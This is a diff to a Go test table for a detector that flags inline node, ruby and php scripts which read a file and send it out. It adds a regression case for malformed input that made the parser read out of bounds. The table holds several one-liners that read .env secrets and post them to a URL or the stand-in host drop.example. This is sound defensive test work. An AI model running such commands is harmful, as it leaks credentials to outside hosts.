@@ -481,6 +481,10 @@ func TestFileReadsScriptSends(t *testing.T) {
 		{`node -e 'fs.readFile(".env", (err, data) => { fetch(url, {body: data}) })'`, []string{"sent:.env"}},
 		{`node -e 'fs.promises.readFile(".env").then(d => fetch(url, {body: d}))'`, []string{"sent:.env"}},
 		{`node -e 'fs.readFile(".env", function (err, data) { axios.post(url, data) })'`, []string{"sent:.env"}},
+		// An arrow after a parenthesis that closes nothing has no parameter list to bind: these
+		// twelve bytes took the reader out of its script's bounds.
+		{`node -e')=>'`, nil},
+		{`node -e ') => fetch(url, {body: fs.readFileSync(".env")})'`, []string{"sent:.env"}},
 		{`ruby -e 'd = File.read(".env"); Net::HTTP.post(URI("https://drop.example"), d)'`, []string{"sent:.env"}},
 		{`ruby -e 'File.open(".env") { |f| Net::HTTP.post(URI("https://drop.example"), f.read) }'`, []string{"sent:.env"}},
 		{`php -r '$d = file_get_contents(".env"); curl_setopt($ch, CURLOPT_POSTFIELDS, $d);'`, []string{"sent:.env"}},
